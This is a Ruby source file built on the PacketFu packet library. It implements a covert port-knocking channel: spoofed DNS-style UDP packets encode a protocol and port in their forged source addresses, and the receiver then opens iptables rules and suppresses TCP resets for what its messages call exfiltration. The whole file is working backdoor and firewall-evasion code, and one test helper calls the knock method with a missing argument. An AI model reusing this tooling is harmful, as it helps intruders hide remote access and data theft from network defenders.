require 'rubygems'
require 'packetfu'

include PacketFu
class Knock
  attr_accessor :iface, :cap
  def initialize(interface)
    @iface = interface
    @tos = nil
  end

  def sniff
	puts "starting sniff"
    @cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => "udp and dst port 53")
    @cap.stream.each do |p|
		puts "packet recieved"
      pkt = Packet.parse p
      a = pkt.ip_saddr.split(".")
      if a[2].to_i == 239 && pkt.udp_sport == 21423
        case a[1].to_i
          when 1..80
			puts "using icmp for exfiltration"
            @tos = "icmp"
          when 81..161
			puts "using tcp for exfiltration"
            @tos = "tcp"
          when 162..254
			puts "using udp for exfiltration"
            @tos = "udp"
          else
            abort "Knock::sniff invalid range"
        end
        sport = a[0].to_i * a[3].to_i
        if @tos == "icmp"
          system("iptables -I INPUT -p " + @tos + " -j ACCEPT")
          t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " -j ACCEPT" ) }
        else
          system("iptables -I INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT")
          t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT") }
        end
        if @tos == "tcp"
          system("iptables -I OUTPUT -p tcp --sport " + sport.to_s + " --tcp-flags RST RST -j DROP")
          t = Thread.new {sleep(100); system("iptables -D OUTPUT -p tcp --sport " + sport.to_s + " --tcp-flags RST RST -j DROP") }
        end
        return sport
      end
    end
  end

  def knock(destIp, tos)
    puts "Sending knock 1"
    c = 239
    @tos = tos
    case @tos
      when "icmp"
        b = rand(80) + 1 #range 1 - 80
      when "tcp"
        b = rand(80) + 81 #rand 81 - 161
      when "udp"
        b = rand(93) + 162 #rand 162 - 254
      else
        puts @tos
        abort "Knock::knock invalid tos"
    end
    while(true)
      a = rand(254) + 1
      d = rand(254) + 1
      e = a * d
      if e > 10000
        break
      end
    end

    $destMac = PacketFu::Utils.arp(destIp, :iface => @iface)



    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 21423, :udp_dst => 53)
    udp_pkt.ip_header.ip_id = 32452
    udp_pkt.eth_daddr = $destMac
    udp_pkt.ip_daddr = destIp
    udp_pkt.ip_saddr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
    puts udp_pkt.ip_saddr
    udp_pkt.payload="\x78"+"\x9e"+"\x01"+"\x00"+"\x00"+"\x01"+"\x00"
    udp_pkt.payload+="\x00"+"\x00"+"\x00"+"\x00"+"\x00"+"\x03"+"\x77"
    udp_pkt.payload+="\x74"+"\x66"+"\x02"+"\x61"+"\x64"+"\x04"+"\x62"
    udp_pkt.payload+="\x63"+"\x69"+"\x74"+"\x02"+"\x63"+"\x61"+"\x00"
    udp_pkt.payload+="\x00"+"\x1c"+"\x00"+"\x01"
    udp_pkt.recalc
    puts udp_pkt.ip_header.ip_id
    udp_pkt.to_w(@iface)
    return e
  end

  def getTos
    return @tos
  end
end

def knockTest
  k = Knock.new("wlan0")
  k.sniff
end

def knockTest2
  k = Knock.new("wlan0")
  k.knock("192.168.0.11")
end

#knockTest2


